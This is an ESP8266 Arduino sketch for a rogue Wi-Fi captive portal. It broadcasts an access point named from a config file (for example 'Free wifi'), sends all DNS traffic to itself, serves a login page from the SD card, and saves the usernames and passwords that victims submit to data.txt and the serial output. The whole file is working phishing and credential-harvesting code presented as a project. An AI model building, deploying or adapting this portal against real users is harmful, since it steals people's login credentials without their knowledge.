#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <String>
#include <SPI.h>
#include <SD.h>
#include <Dictionary.h>

const byte DNS_PORT = 53;
IPAddress apIP(8, 8, 8, 8);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
File root;

const String defaultHtml = "<!DOCTYPE html>"
                            "<html lang=\"en\">"
                            "<head>"
                              "<meta charset=\"UTF-8\">"
                              "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">"
                              "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
                              "<title>This is a test</title>"
                            "</head>"
                            "<body>"
                              "<h1>Hi, this is a test</h1><br>"
                              "<h2>www.github.com/euMts/captive_portal</h2>"
                            "</body>"
                            "</html>";

void setup() {
  delay(15000);
  Serial.begin(9600);
  while(!SD.begin(SS)){
      // Wait for the sd to begin.
    }
  root = SD.open("/");
  String cfgStr = read_archive("config.json");
  Dictionary cfgJson = read_json(cfgStr);
  String ssid = cfgJson["ssid"]; // Ex. Free wifi
  String page = cfgJson["page"]; // Ex. pages/index.html
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid);

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // reply to all requests with same HTML
  webServer.onNotFound([page]() {
    webServer.send(200, "text/html", read_html(page));
  });
  webServer.on("/login", HTTP_POST, handleLogin); //handle requests to '/login'
  webServer.begin();
}

// Read the html file, return default if not found
String read_html(String arq) { // Ex. read_html("pages/index.html")
  File myFile = SD.open(arq);
  String content;
  if (myFile) {
      while (myFile.available()){
        char myChar = myFile.read();
        content += myChar;
      }
      myFile.close();
      }
  else { // File not found
      Serial.println("read_html failed");
      content = defaultHtml; // default value
      }
  return content;      
}

// Read the html file, return default if not found
String read_archive(String arq){ // Ex. read_archive("config.json")
  File myFile = SD.open(arq);
  String content;
  if (myFile) {
      while (myFile.available()){
        char myChar = myFile.read();
        content += myChar;
      }
      myFile.close();
      }
  else { // File not found
      Serial.println("read_archive failed");
      content = ("{\"ssid\":\"Captive Portal\",\"page\":\"pages/index.html\"}"); // default value
      }
  return content;    
}

// Save the content into a text file
void write_archive(String arq, String content) { // Ex. write_archive("myFile.txt", "some text");
    File myFile = SD.open(arq, FILE_WRITE);
    if (myFile) {
        myFile.print("\n" + content);
        myFile.close();
        }
    else {
        Serial.println("write_archive failed");
        }
}

// Convert string to dict
Dictionary read_json(String content){ // Ex. read_json("{\"username\":\"Matheus\"}")
  Dictionary *dict = new Dictionary();
  dict->jload(content);
  return *dict; // Return the pointer
}

// Handle the post requests to /login
void handleLogin() {
    String user = webServer.arg("username");
    String password = webServer.arg("password");
    String currentDate = webServer.arg("date");
    Serial.println("User: " + user);
    Serial.println("Password: " + password);
    Serial.println("Time: " + currentDate);
    String data = ("User: " + user + " Password: " + password + " Time: " + currentDate);
    write_archive("data.txt", data);
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}